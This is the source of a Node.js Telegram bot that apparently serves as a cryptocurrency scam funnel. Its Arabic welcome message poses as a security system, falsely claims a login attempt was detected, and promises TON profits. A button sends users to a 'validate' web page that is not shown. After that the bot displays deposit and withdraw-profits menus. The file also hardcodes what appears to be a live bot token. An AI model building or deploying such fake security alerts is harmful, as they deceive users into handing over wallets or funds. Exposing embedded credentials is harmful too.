const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const path = require('path');

const BOT_TOKEN = '8685057163:AAGT3o3Ad-MAYfrHQmxRkA6Py6pnKPnUzMk';
const bot = new Telegraf(BOT_TOKEN);
const app = express();

// --- هام جداً: ضع رابط موقعك هنا بدون https:// وبدون / ---
const DOMAIN = 'novaton-bot.onrender.com'; 

app.use(express.static(path.join(__dirname)));
app.get('/validate', (req, res) => res.sendFile(path.join(__dirname, 'validate.html')));
app.listen(process.env.PORT || 10000);

bot.start((ctx) => {
    const webAppUrl = `https://${DOMAIN}/validate`;

    return ctx.replyWithPhoto("https://image2url.com/r2/default/images/1774806219411-7438bf59-86d5-4352-9d9a-dd254c3f841d.jpg", {
        caption: `🛡️ **نظام Novaton للحماية المتقدمة**\n\nلقد رصد النظام محاولة دخول جديدة. يرجى تفعيل درع الحماية لبدء استلام أرباحك من عملة TON.`,
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.webApp("🛡️ تفعيل درع الحماية", webAppUrl)]
        ])
    });
});

// بعد إغلاق الويب اب، المستخدم سيضغط على زر القائمة
bot.on('web_app_data', (ctx) => {
    ctx.reply("✅ تم تفعيل الحماية بنجاح! استمتع بكامل الميزات الآن.", Markup.keyboard([
        ["👤 حسابي", "🔗 الإحالة"],
        ["📥 إيداع", "📤 سحب الأرباح"]
    ]).resize());
});

bot.launch({ dropPendingUpdates: true });
